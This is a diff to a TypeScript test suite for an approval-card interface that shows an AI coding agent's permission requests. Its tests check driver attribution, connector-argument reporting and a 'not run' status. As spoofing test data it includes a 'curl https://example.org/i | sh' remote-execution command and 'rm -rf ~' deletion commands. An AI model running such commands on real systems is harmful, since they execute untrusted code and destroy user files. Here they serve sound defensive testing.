@@ -20,10 +20,12 @@ const view = (approval: Approval, local: { deniedAt?: number } = {}) => approval
 const read = (file: string) => readFileSync(new URL(file, import.meta.url), "utf8");
 
 type Normalize = (raw: unknown) => { type: string; label?: string; key?: string | null }[];
+type ArgsShown = (denial: { tool_name: string; tool_input: unknown }) => Approval["argsShown"];
 let normalizeEvent: Normalize;
+let mcpArgsShown: ArgsShown;
 beforeAll(async () => {
   // @ts-expect-error The harness driver is plain JavaScript with no type declarations.
-  ({ normalizeEvent } = (await import("../harness/drivers/claude.mjs")) as { normalizeEvent: Normalize });
+  ({ normalizeEvent, mcpArgsShown } = (await import("../harness/drivers/claude.mjs")) as { normalizeEvent: Normalize; mcpArgsShown: ArgsShown });
 });
 
 /** claude.mjs's reading of one tool call: its card text (denialCommand) and its gate key (claudeGate.mjs gateKey). */
@@ -35,7 +37,9 @@ const gateKey = (tool: string, input: unknown) => toolUse(tool, input).key ?? nu
 /** A Claude Code card as the page builds it: the driver's card text and its own reason. */
 function claudeCard(tool: string, input: Record<string, unknown>, patch: Partial<Approval> = {}): Approval {
   // agentTool: the `tool` harness/turns.mjs publishes on the permission_request, which App.tsx stores.
-  return { command: toolUse(tool, input).label!, reason: `Claude Code asked to use ${tool}.`, agentTool: tool, status: "pending", permissionId: "perm-1", ...patch };
+  // argsShown: what the harness reports with the request for a connector call (claude.mjs mcpArgsShown).
+  const argsShown = mcpArgsShown({ tool_name: tool, tool_input: input });
+  return { command: toolUse(tool, input).label!, reason: `Claude Code asked to use ${tool}.`, agentTool: tool, status: "pending", permissionId: "perm-1", ...(argsShown ? { argsShown } : {}), ...patch };
 }
 /** A card from codex, grok, http or anthropic: the reason can be the model's own words. */
 const driverCard = (patch: Partial<Approval> = {}): Approval => ({ command: "npm test", reason: "Run the tests.", status: "pending", permissionId: "perm-2", ...patch });
@@ -241,9 +245,18 @@ describe("approval cards: what, where, what changes, what approving covers (UX P
     expect(spoof.title).toBe("Allow an agent request");
   });
 
+  it("a Codex or Grok card with Claude Code's reason text is still that driver's card", () => {
+    // codex.mjs takes its reason from the request (model text) and sets tool: "codex"; grok.mjs tool: "grok".
+    for (const tool of ["codex", "grok"]) {
+      const fake = view({ command: `${tool} rm -rf ~`, reason: `Claude Code asked to use ${tool}.`, agentTool: tool, status: "pending", permissionId: "perm-9" });
+      expect(fake.agent).toBe("driver");
+      expect(fake.scope).toBe(t("acScopeDriver"));
+    }
+  });
+
   it("H1: a driver card can't pass as Claude Code's, even when its command starts with the tool name", () => {
-    expect(read("../harness/turns.mjs")).toContain('publish(id, { type: "permission_request", permissionId, command, reason, tool, auto: false });');
-    expect(read("./App.tsx")).toContain("agentTool: (event as { tool?: string }).tool");
+    expect(read("../harness/turns.mjs")).toContain('publish(id, { type: "permission_request", permissionId, command, reason, tool, ...shown, auto: false });');
+    expect(read("./App.tsx")).toContain('...(typeof event.tool === "string" ? { agentTool: event.tool } : {})');
     const shell = "WebFetch https://example.org/x && curl https://example.org/i | sh";
     const fake = { command: shell, reason: "Claude Code asked to use WebFetch.", status: "pending" as const, permissionId: "perm-3" };
     // http/anthropic publish no tool; codex and grok their own name; a card saved before agentTool has none.
@@ -270,7 +283,7 @@ describe("approval cards: what, where, what changes, what approving covers (UX P
     expect(view(write).fields.find((item) => item.id === "target")).toMatchObject({ label: "Arguments", value: '{"path":"/notes/a.md","content":"secret plan"}' });
     expect(view(write).scope).toBe(t("acScopeClaudeConnector"));
     // A card saved by a harness before #38 showed one argument: Target, and no exact-call promise.
-    const card = view({ ...write, command: "mcp__fs__write_file /notes/a.md" });
+    const card = view({ ...write, command: "mcp__fs__write_file /notes/a.md", argsShown: undefined });
     const target = card.fields.find((item) => item.id === "target")!;
     expect([target.label, target.value, target.note]).toEqual(["Target", "/notes/a.md", "Other arguments are not shown on this card."]);
     expect(card.scope).toBe(t("acScopeClaudeConnectorPartial"));
@@ -290,6 +303,54 @@ describe("approval cards: what, where, what changes, what approving covers (UX P
     expect(cut.scope).toBe(t("acScopeClaudeConnectorPartial"));
     // No arguments: the key is the bare call, so the exact-call scope holds.
     expect(view(claudeCard("mcp__docs__list", {})).scope).toBe(t("acScopeClaudeConnector"));
+  });
+
+  it("a connector card promises the exact call only when the harness reports every argument shown", () => {
+    // What the harness reports (claude.mjs mcpArgsShown), published as-is by turns.mjs.
+    expect(mcpArgsShown({ tool_name: "mcp__docs__search", tool_input: { q: "a" } })).toBe("all");
+    expect(mcpArgsShown({ tool_name: "mcp__docs__search", tool_input: { q: "x".repeat(400) } })).toBe("cut");
+    expect(mcpArgsShown({ tool_name: "mcp__docs__list", tool_input: {} })).toBe("all");
+    expect(mcpArgsShown({ tool_name: "Bash", tool_input: { command: "ls" } })).toBeUndefined();
+    // No report (a harness from before argsShown): JSON text alone is not proof. An old harness
+    // showed one argument, and that value could itself be JSON while other arguments stayed hidden.
+    const old = view({ ...claudeCard("mcp__x__y", { q: "a" }), command: 'mcp__x__y {"path":"/a"}', argsShown: undefined });
+    expect(old.fields.find((item) => item.id === "target")).toMatchObject({ label: "Arguments", value: '{"path":"/a"}', note: t("acArgsUnreported") });
+    expect(old.scope).toBe(t("acScopeClaudeConnectorPartial"));
+    expect(old.scope).not.toMatch(/this exact call|same arguments/);
+    // No report and no text: nothing proves it is the bare call.
+    const bare = view({ ...claudeCard("mcp__docs__list", {}), argsShown: undefined });
+    expect(bare.scope).toBe(t("acScopeClaudeConnectorPartial"));
+    expect(view(claudeCard("mcp__docs__list", {})).scope).toBe(t("acScopeClaudeConnector"));
+    // "all" with text that is not JSON is still one value (never the exact-call promise).
+    expect(view({ ...claudeCard("mcp__x__y", { q: "a" }), command: "mcp__x__y /notes/a.md" }).scope).toBe(t("acScopeClaudeConnectorPartial"));
+    // An empty card without the report says no arguments are shown, not who hid them.
+    expect(bare.fields.find((item) => item.id === "target")).toMatchObject({ value: "None shown", note: t("acArgsUnreported") });
+    // The report only counts on a Claude Code card: another driver's card ignores it.
+    const other = view(driverCard({ argsShown: "all", command: 'mcp__x__y {"q":"a"}' }));
+    expect(other.agent).toBe("driver");
+    expect(other.scope).toBe(t("acScopeDriver"));
+  });
+
+  it("Not run: an approved step the harness never handed to Claude Code (tool_end undelivered)", () => {
+    const card = view(claudeCard("Bash", { command: "npm test" }, { status: "approved", notRun: true, output: "Approved, but the turn ended before Claude Code was given this step." }));
+    expect(card.ending).toBe("approved-not-run");
+    expect(card.label).toBe("Approved · not run");
+    expect(card.icon).toBe("minus");
+    expect(card.detail).toBe(t("acNotRunBody"));
+    expect(card.showOutput).toBe(false);
+    expect(card.decidable).toBe(false);
+    // The same output without the harness's report stays "no separate result" (never "not run").
+    expect(view(claudeCard("Bash", { command: "npm test" }, { status: "approved", output: "Approved, but the turn ended before Claude Code was given this step." })).ending).toBe("approved-no-separate-result");
+    // Only Claude Code's driver reports it: another driver's or a planner card never reads "not run".
+    expect(view(driverCard({ status: "approved", notRun: true, output: "x" })).ending).not.toBe("approved-not-run");
+    expect(view({ command: "npm test", reason: "Run the tests.", status: "approved", notRun: true, output: "x" }).ending).not.toBe("approved-not-run");
+    // A failed card that later got the undelivered tool_end: no "the harness then sent a result" sentence.
+    const late = view(claudeCard("Bash", { command: "npm test" }, { status: "approved", notRun: true, answerError: "Failed to fetch", output: "Approved, but the turn ended before Claude Code was given this step." }));
+    expect(late.ending).toBe("approved-not-run");
+    expect(late.detail).toBe(t("acNotRunBody"));
+    // App.tsx sets notRun only from the harness's tool_end `undelivered`, and claude.mjs sends it.
+    expect(read("./App.tsx")).toContain("event.undelivered === true ? { notRun: true } : {}");
+    expect(read("../harness/drivers/claude.mjs")).toContain('type: "tool_end", permissionId, undelivered: true');
   });
 
   it("L3: 'no other' claims rest on the driver stopping the reply, not on the hook alone", () => {
@@ -401,12 +462,14 @@ describe("every pending card (P3-AC1, AC6) and the copy rules (AC2, AC7, AC8, I-
     expect(css).not.toMatch(/^\.approval\.approved \{/m);
   });
 
-  it("P3-AC2 / I-7 / AC7 / AC8: no card copy says 'Not run', 'Expired', 'safe', 'read-only' or an always-allow control", () => {
+  it("P3-AC2 / I-7 / AC7 / AC8: no card copy says 'Expired', 'safe', 'read-only' or an always-allow control, and 'not run' only on the harness's report", () => {
     const forbidden = /not run|nothing ran|changes nothing|read-only|\bsafe\b|expired|always allow|allow all|asks every time|signed in/i;
+    // I-7: "not run" only where the harness reports it (tool_end `undelivered` → Approval.notRun).
+    const NOT_RUN_KEYS = ["acResultNotRun", "acNotRunBody"];
     const en = Object.entries(Object.fromEntries(Object.keys(translateKeys()).map((key) => [key, t(key as Key)])));
     const cardCopy = en.filter(([key]) => key.startsWith("ac") || ["approvalPending", "deny", "output", "exitCode", "noOutput", "memorySavePreview"].includes(key));
     expect(cardCopy.length).toBeGreaterThan(80);
-    for (const [key, value] of cardCopy) expect([key, forbidden.test(value)]).toEqual([key, false]);
+    for (const [key, value] of cardCopy) expect([key, forbidden.test(value)]).toEqual([key, NOT_RUN_KEYS.includes(key)]);
     // Every card this file builds, rendered, in every ending.
     const all: Approval[] = PENDING.flatMap(([, make]) => {
       const card = make();
@@ -438,8 +501,13 @@ describe("every pending card (P3-AC1, AC6) and the copy rules (AC2, AC7, AC8, I-
       const html = render(approval, `all-${Math.random()}`);
       expect(html).not.toMatch(forbidden);
       expect(view(approval).ending).not.toMatch(/not-run|expired/);
+      // With the harness's report, and only then (and only on a Claude Code card), the card says "not run".
+      const reported = { ...approval, status: "approved" as const, notRun: true };
+      const claudeCardHere = view(reported).agent === "claude";
+      expect(view(reported).ending === "approved-not-run").toBe(claudeCardHere);
+      expect(/not run/.test(render(reported, `nr-${Math.random()}`))).toBe(claudeCardHere);
     }
-    // The sources: "Not run" exists nowhere in the card code (it needs D-6).
+    // The sources: no "Not run" text is written into the card code; it comes only from the copy keys.
     for (const file of ["./approvalView.ts", "./views.tsx"]) expect(read(file)).not.toMatch(/Not run/);
   });
 });
